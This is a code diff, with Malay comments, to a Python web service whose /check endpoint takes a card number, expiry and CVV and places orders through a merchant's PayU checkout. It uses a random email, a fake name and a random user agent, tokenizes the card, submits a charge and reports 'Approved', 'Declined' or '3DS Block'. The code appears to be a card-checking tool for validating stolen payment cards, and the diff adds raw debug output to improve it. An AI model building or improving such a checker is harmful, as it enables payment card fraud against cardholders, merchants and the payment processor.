@@ -47,9 +47,9 @@ def _process_payu(session, cc, mm, yy, cvv_code, site_url, ua):
     start_time = time.time()
     email = _random_email()
     name = "Jan Kowalski"
+    raw_debug_logs = [] # Untuk kumpul error/logs jika berlaku anomali
     
     # STEP 1: DYNAMIC MERCHANT REQUEST
-    # Script akan auto-detect sama ada perlu POST ke /ajax/horse_payu/ atau /payu.php atau default
     if 'horse_payu' in site_url or 'ajax' in site_url:
         ajax_url = site_url if site_url.endswith('/') else site_url + '/'
         headers1 = {
@@ -75,7 +75,6 @@ def _process_payu(session, cc, mm, yy, cvv_code, site_url, ua):
     r1 = session.post(ajax_url, headers=headers1, data=data1, allow_redirects=False, timeout=30)
     order_id, token = None, None
 
-    # Ekstrak Order ID & Token dari Header Location atau Body
     loc = r1.headers.get('Location', '')
     body = r1.text
     search_pool = loc + " " + body
@@ -86,13 +85,11 @@ def _process_payu(session, cc, mm, yy, cvv_code, site_url, ua):
     if tok: token = tok.group(1)
 
     if not order_id or not token:
-        return None, None, None, "Failed to extract Order ID", time.time() - start_time
+        return None, None, None, "Failed to extract Order ID", time.time() - start_time, {"error": "No orderId", "body": body[:500]}
 
     # STEP 2: LOAD PAYU GATEWAY
-    session.get('https://secure.payu.com/pay/', params={'orderId': order_id, 'token': token}, headers={'user-agent': ua}, timeout=30)
-    
     try:
-        page_html = session.get('https://secure.payu.com/pay/', params={'orderId': order_id, 'token': token}, timeout=30).text
+        page_html = session.get('https://secure.payu.com/pay/', params={'orderId': order_id, 'token': token}, headers={'user-agent': ua}, timeout=30).text
         amt_match = re.search(r'"totalAmount"\s*:\s*"?(\d+)"?', page_html)
         final_amount = int(amt_match.group(1)) if amt_match else 2000
     except:
@@ -107,13 +104,17 @@ def _process_payu(session, cc, mm, yy, cvv_code, site_url, ua):
     json3 = {'posId': 'PAYU S.A.', 'type': 'SINGLE', 'card': {'number': cc, 'cvv': cvv_code, 'expirationMonth': mm, 'expirationYear': yy}}
     
     r3 = session.post('https://secure.payu.com/api/front/tokens', headers=headers3, json=json3, timeout=30)
-    token_data = r3.json()
+    try:
+        token_data = r3.json()
+    except:
+        return None, None, None, "Failed to parse token JSON", time.time() - start_time, {"error": "Token parse fail", "raw": r3.text}
+
     card_token = token_data.get('value')
 
     if not card_token:
         err = token_data.get('error', {})
         err_msg = err.get('message', str(err)) if isinstance(err, dict) else str(err)
-        return None, None, None, f"Tokenization Failed: {err_msg}", time.time() - start_time
+        return None, None, None, f"Tokenization Failed: {err_msg}", time.time() - start_time, token_data
 
     # STEP 4: CHARGE
     json4 = {
@@ -125,11 +126,14 @@ def _process_payu(session, cc, mm, yy, cvv_code, site_url, ua):
     }
     
     r4 = session.post(f'https://secure.payu.com/api/front/orders/{order_id}/payments', headers=headers3, json=json4, timeout=30)
-    pay_data = r4.json()
+    try:
+        pay_data = r4.json()
+    except:
+        return None, None, None, "Failed to parse payment JSON", time.time() - start_time, {"error": "Payment parse fail", "raw": r4.text}
 
     if pay_data.get('status') == 'ERROR' or pay_data.get('errorCode'):
         err_desc = pay_data.get('error', {}).get('description', '') if isinstance(pay_data.get('error'), dict) else str(pay_data.get('errorCode', ''))
-        return "ERROR", err_desc, "Inactive", f"Declined: {err_desc}", time.time() - start_time
+        return "ERROR", err_desc, "Inactive", f"Declined: {err_desc}", time.time() - start_time, pay_data
 
     # STEP 5: POLL BANK STATUS
     continue_url = pay_data.get('continueUrl', '')
@@ -142,14 +146,19 @@ def _process_payu(session, cc, mm, yy, cvv_code, site_url, ua):
     value = final_status.get('value', '')
     elapsed = round(time.time() - start_time, 2)
 
+    # DEBUGGING: Jika status tidak jelas, hantar RAW DATA untuk kita analisa
+    if not category and not value:
+        return "UNCERTAIN", "Empty response", "Inactive", "Uncertain Gateway Response", elapsed, final_status
+
     if category == 'SUCCESS':
-        return "SUCCESS", "ORDER_PLACED", "Inactive", "Approved", elapsed
+        return "SUCCESS", "ORDER_PLACED", "Inactive", "Approved", elapsed, final_status
     elif category in ('WARNING_CONTINUE_3DS', 'IN_PROGRESS'):
-        return "3DS_TRIGGERED", value, "Active", "Declined (3DS Block)", elapsed
+        return "3DS_TRIGGERED", value, "Active", "Declined (3DS Block)", elapsed, final_status
     elif category == 'ERROR':
-        return "ERROR", value, "Inactive", f"Declined: {value}", elapsed
+        return "ERROR", value, "Inactive", f"Declined: {value}", elapsed, final_status
     else:
-        return "UNKNOWN", value, "Inactive", f"Uncertain: {value}", elapsed
+        # Jika masuk sini, bermakna ada response lain yang kita tak capture
+        return "UNKNOWN", value, "Inactive", f"Uncertain: {category}", elapsed, final_status
 
 @app.get("/check")
 def check_card(
@@ -176,7 +185,7 @@ def check_card(
         }
 
     try:
-        gateway, bank_res, tds_status, response_msg, elapsed_time = _process_payu(
+        gateway, bank_res, tds_status, response_msg, elapsed_time, raw_data = _process_payu(
             session, card_num, mm, yy, cvv_code, site, _random_ua()
         )
         
@@ -187,7 +196,8 @@ def check_card(
             "Response": response_msg,
             "Bank Response": bank_res,
             "3ds": tds_status,
-            "Time": f"{elapsed_time}s"
+            "Time": f"{elapsed_time}s",
+            "Debug_Raw_Data": raw_data  # Saya tambah ni sementara untuk kita nampak apa yang PayU hantar
         }
     except requests.exceptions.Timeout:
         return {
@@ -197,7 +207,8 @@ def check_card(
             "Response": "Error: Timeout",
             "Bank Response": "None",
             "3ds": "Inactive",
-            "Time": "30.0s"
+            "Time": "30.0s",
+            "Debug_Raw_Data": {"error": "Timeout"}
         }
     except Exception as e:
         return {
@@ -207,5 +218,6 @@ def check_card(
             "Response": f"Error: {str(e)}",
             "Bank Response": "None",
             "3ds": "Inactive",
-            "Time": "0.0s"
+            "Time": "0.0s",
+            "Debug_Raw_Data": {"error": str(e)}
         }
